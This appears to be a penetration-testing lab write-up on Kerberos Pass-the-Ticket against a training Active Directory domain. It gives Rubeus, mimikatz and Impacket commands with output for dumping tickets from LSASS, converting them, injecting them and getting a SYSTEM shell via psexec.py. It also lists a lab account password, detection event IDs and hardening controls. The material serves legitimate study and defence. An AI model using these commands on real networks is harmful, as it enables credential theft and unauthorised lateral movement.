# 07 — Pass-the-Ticket (PtT)

> **Lab:** INLANEFREIGHT.LOCAL · DC: `172.16.5.5` (ACADEMY-EA-DC01) · Attack host: `172.16.5.225` (Kali Linux)  
> **MITRE ATT&CK:** [T1550.003 — Use Alternate Authentication Material: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)  
> **Difficulty:** Medium · **Impact:** Lateral Movement → Privilege Escalation → Persistence

---

## Table of Contents

1. [Overview](#1-overview)
2. [Root Cause Analysis](#2-root-cause-analysis)
3. [Prerequisites](#3-prerequisites)
4. [Lab Environment](#4-lab-environment)
5. [Attack Chain](#5-attack-chain)
6. [Phase 1 — Harvest Tickets from LSASS (Windows)](#6-phase-1--harvest-tickets-from-lsass-windows)
7. [Phase 2 — Convert and Use Tickets on Linux (Impacket)](#7-phase-2--convert-and-use-tickets-on-linux-impacket)
8. [Phase 3 — Inject Ticket and Move Laterally](#8-phase-3--inject-ticket-and-move-laterally)
9. [Phase 4 — PtT via Linux (ccache files)](#9-phase-4--ptt-via-linux-ccache-files)
10. [Phase 5 — Unconstrained Delegation Ticket Theft](#10-phase-5--unconstrained-delegation-ticket-theft)
11. [Validation](#11-validation)
12. [Detection](#12-detection)
13. [Hardening](#13-hardening)
14. [References](#14-references)

---

## 1. Overview

Pass-the-Ticket (PtT) is a lateral movement technique where an attacker **steals Kerberos tickets from memory** (or generates forged ones) and injects them into an active logon session to impersonate the ticket's original owner — without needing the account password or NT hash.

Unlike Pass-the-Hash (which works over NTLM), PtT operates entirely within the **Kerberos protocol**. This makes it effective even in environments with NTLM disabled.

| Ticket Type | Issued By | Grants Access To | Lifetime |
|---|---|---|---|
| **TGT** (Ticket Granting Ticket) | KDC (AS-REP) | Request any TGS in the domain | 10 hours (default) |
| **TGS** (Ticket Granting Service) | KDC (TGS-REP) | Specific service (SPN) | 10 hours (default) |

A stolen **TGT** is the higher-value target — it can be used to request TGS tickets for any service. A stolen **TGS** only grants access to the specific service it was issued for.

---

## 2. Root Cause Analysis

```
PASS-THE-TICKET (TGT stolen from LSASS)
────────────────────────────────────────────────────────────────
  Attacker extracts TGT from victim's LSASS
  ↓
  Injects TGT into their own logon session (LUID)
  ↓
  Uses injected TGT to request TGS for any service
  ↓
  Service authenticates the attacker as the ticket owner
```

**Why tickets are stored in LSASS:** Windows stores Kerberos credentials and tickets in the LSASS process so SSO works — users don't re-authenticate every time they access a new resource. This convenience is the attack surface.

---

## 3. Prerequisites

| Requirement | Detail |
|---|---|
| **LSASS access (Windows)** | Local admin on target to dump LSASS memory, OR SeDebugPrivilege |
| **Tools (Windows)** | `Rubeus.exe`, `mimikatz.exe` |
| **Tools (Linux)** | `impacket-getST`, `impacket-ticketConverter`, `impacket-psexec` |
| **TGT validity** | Stolen TGT must still be within its lifetime (typically 10 hours) |
| **Network access** | Attacker machine must reach KDC (port 88) and target service |

---

## 4. Lab Environment

```
┌──────────────────────────────────────────────────────────────────┐
│  INLANEFREIGHT.LOCAL                                             │
│                                                                  │
│  ACADEMY-EA-DC01:   172.16.5.5    (KDC)                          │
│  ACADEMY-EA-MS01:   172.16.5.130  (domain-joined workstation)    │
│  ACADEMY-EA-FILE:   172.16.5.125  (target file server)           │
│                                                                  │
│  Foothold account: forend:Klmcargo2 (domain user)               │
│  Foothold machine: ACADEMY-EA-MS01 (access via RDP or WinRM)    │
│                                                                  │
│  Attack host: 172.16.5.225 (Kali) ens224                         │
└──────────────────────────────────────────────────────────────────┘
```

---

## 5. Attack Chain

```
[1] FOOTHOLD              [2] HARVEST TICKETS      [3] SELECT TARGET
─────────────────         ──────────────────────   ──────────────────────
Credential/hash      →    Rubeus dump /all    →    Identify high-value
 gives access to          (extracts .kirbi)        accounts in dump
 domain workstation       mimikatz kerberos::list   (DA, service accounts)
                          
                          [4] INJECT TICKET        [5] MOVE LATERALLY
                          ──────────────────────   ──────────────────────
                          Rubeus /ptt         →    Access any service
                          mimikatz /ptt            the ticket owner
                          KRB5CCNAME (Linux)       has rights on
```

---

## 6. Phase 1 — Harvest Tickets from LSASS (Windows)

### 6.1 List All Tickets in Current Session (Rubeus)

```cmd
C:\htb> Rubeus.exe triage
```

```
 -----------------------------------------------------------------------
 | LUID    | UserName          | Service              | EndTime        |
 -----------------------------------------------------------------------
 | 0x463bc | forend @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL | 10/15/2026 11:10:48 AM |
 | 0x463bc | forend @ INLANEFREIGHT.LOCAL | cifs/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL | 10/15/2026 11:10:49 AM |
 | 0x1b04d | daniel.carter @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL | 10/15/2026 09:10:38 AM |
 -----------------------------------------------------------------------
```

`krbtgt/INLANEFREIGHT.LOCAL` entries are TGTs — highest value. Multiple LUIDs indicate multiple active logon sessions.

### 6.2 Dump All Tickets from All Sessions (Rubeus)

```cmd
C:\htb> Rubeus.exe dump /nowrap
```

### 6.3 Export Tickets as .kirbi Files (mimikatz)

```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export
```

```
 * Saved to file [0;6f9d]-2-0-40a10000-daniel.carter@cifs-ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL.kirbi !
 * Saved to file [0;6f9d]-2-2-40e10000-daniel.carter@krbtgt-INLANEFREIGHT.LOCAL.kirbi !
```

---

## 7. Phase 2 — Convert and Use Tickets on Linux (Impacket)

Tickets exported from Windows (`.kirbi`) must be converted to `.ccache` (MIT Kerberos / Linux format) before Impacket tools can use them.

> **Note on secretsdump.py:** `secretsdump.py` does **not** extract live Kerberos tickets from LSASS memory — that is the job of `mimikatz sekurlsa::tickets` (Windows) or `pypykatz`/`lsassy`. Do not confuse these tool functions.

### 7.1 Convert .kirbi to ccache Format

```bash
Hackerpatel007_1@htb[/htb]$ ticketConverter.py \
  '[0;6f9d]-2-2-40e10000-daniel.carter@krbtgt-INLANEFREIGHT.LOCAL.kirbi' \
  daniel.ccache
```

```
[*] converting kirbi to ccache...
[+] done
```

### 7.2 Set Environment Variable

```bash
Hackerpatel007_1@htb[/htb]$ export KRB5CCNAME=/home/kali/daniel.ccache
```

---

## 8. Phase 3 — Inject Ticket and Move Laterally

### 8.1 Inject via Rubeus (Windows)

```cmd
C:\htb> Rubeus.exe ptt /ticket:[0;6f9d]-2-2-40e10000-daniel.carter@krbtgt-INLANEFREIGHT.LOCAL.kirbi
```

```
[+] Ticket successfully imported!
```

### 8.2 Inject via mimikatz

```cmd
mimikatz # kerberos::ptt [0;6f9d]-2-2-40e10000-daniel.carter@krbtgt-INLANEFREIGHT.LOCAL.kirbi
```

### 8.3 Verify Ticket is Injected

```cmd
C:\htb> klist
```

```
#0>     Client: daniel.carter @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 10/15/2026 09:10:38 (local)
        End Time:   10/15/2026 17:10:38 (local)
```

### 8.4 Access Target Resource

```cmd
C:\htb> dir \\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\C$
```

> **Access rights depend on the impersonated account, not the ticket.** Access to `C$` succeeds here because `daniel.carter` has local administrator rights on `ACADEMY-EA-FILE`. PtT with a standard domain user TGT reaches only resources that account can legitimately access.

---

## 9. Phase 4 — PtT via Linux (ccache files)

### 9.1 Use Stolen Ticket with psexec.py

```bash
Hackerpatel007_1@htb[/htb]$ export KRB5CCNAME=/home/kali/daniel.ccache

Hackerpatel007_1@htb[/htb]$ psexec.py inlanefreight.local/daniel.carter@ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL -k -no-pass
```

```
C:\Windows\system32> whoami
nt authority\system
```

### 9.2 Use with smbclient

```bash
Hackerpatel007_1@htb[/htb]$ smbclient //ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL/C$ -k --no-pass
```

> **smbclient flag syntax:** Use `--no-pass` (double dash) or `-N`. The single-dash form `-no-pass` is not valid smbclient syntax.

---

## 10. Phase 5 — Unconstrained Delegation Ticket Theft

Unconstrained delegation machines store forwarded TGTs of users who authenticate to them. If the machine is compromised, any cached TGTs are harvestable — including domain admin TGTs if an eligible admin recently authenticated.

```powershell
PS C:\htb> Get-DomainComputer -Unconstrained | Select-Object -Property name, dnshostname
```

```
ACADEMY-EA-MS01  ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
```

After compromising the unconstrained machine, dump all tickets with Rubeus and harvest any high-value TGTs present in memory.

---

## 11. Validation

```bash
Hackerpatel007_1@htb[/htb]$ klist
```

```
Credentials cache: FILE:/home/kali/daniel.ccache
        Principal: [email protected]

  Issued                Expires               Principal
Oct 15 09:10:38 2026  Oct 15 17:10:38 2026  krbtgt/[email protected]
```

---

## 12. Detection

### Key Event IDs

| Event ID | Location | Description |
|---|---|---|
| **4768** | DC Security Log | TGT requested (AS-REQ) — requires Success/Failure on "Audit Kerberos Authentication Service" |
| **4769** | DC Security Log | TGS requested — **not default**; requires Success on "Audit Kerberos Service Ticket Operations" |
| **4771** | DC Security Log | TGT request failed — **not default**; requires Failure auditing |
| **4624 Type 3** | Target host | Network logon via Kerberos |

### Anomaly: Ticket Reused from Different IP

```
TGT harvested from LSASS → reused from different IP:
- 4768: TGT issued to workstation A (legitimate)
- 4769: TGS requested from IP B (attacker) using same TGT
  → Source IP mismatch is the key indicator
```

> **Credential Guard:** Protects TGTs stored in LSASS — `sekurlsa::tickets` and Rubeus dump cannot extract TGTs from a Credential Guard–protected process. However, Kerberos **service tickets are NOT protected** by Credential Guard and remain accessible in LSASS memory.

### Detection Template

> **This is a detection template, not a deployable Sigma rule.** The condition `condition: tgs` only matches Event 4769 in isolation — it does not perform IP correlation. That correlation requires a SIEM aggregation query with a time window and a session join.

```yaml
# DETECTION TEMPLATE — requires SIEM-native correlation, not deployable as-is
title: Kerberos Ticket Used from Unusual Source IP
id: b4f26a29-9b51-4a3b-b441-e5c09aeecbda
status: test
description: >
  TGS requested from an IP different from where the original TGT was issued.
  Requires cross-event correlation: join 4768 and 4769 on ticket serial / client
  name and compare Client Address fields within a session window.
logsource:
  product: windows
  service: security
detection:
  tgt:
    EventID: 4768
  tgs:
    EventID: 4769
  condition: tgs
  # Production implementation: correlate Client Address in 4768 with Client
  # Address in 4769 for the same AccountName within a 10-hour window.
falsepositives:
  - Multi-homed hosts, NAT environments, load-balanced services
level: high
tags:
  - attack.lateral_movement
  - attack.t1550.003
```

---

## 13. Hardening

| Control | Detail |
|---|---|
| **Credential Guard** | Isolates TGTs in VSM — blocks sekurlsa::tickets/Rubeus TGT dump. Service tickets NOT protected. |
| **Protected Users group** | Restricts NTLM, legacy credential caching, unconstrained delegation. Kerberos-based ticket caching is not disabled. |
| **Ticket lifetime policy** | Reduce TGT maximum lifetime (GPO: 4 hours instead of 10) |
| **Avoid unconstrained delegation** | Use constrained delegation (S4U2Proxy) with specific SPNs only |
| **Account tiering** | DA accounts never log into workstations — eliminates high-value ticket harvesting |

---

## 14. References

| Resource | Description |
|---|---|
| [MITRE T1550.003](https://attack.mitre.org/techniques/T1550/003/) | Use Alternate Authentication Material: Pass the Ticket |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos abuse toolkit |
| [impacket ticketConverter](https://github.com/fortra/impacket) | .kirbi ↔ .ccache conversion |
| [Protected Users Security Group](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) | Hardened user class |

---

*Source: HTB Academy — Active Directory Penetration Tester Path 2024*
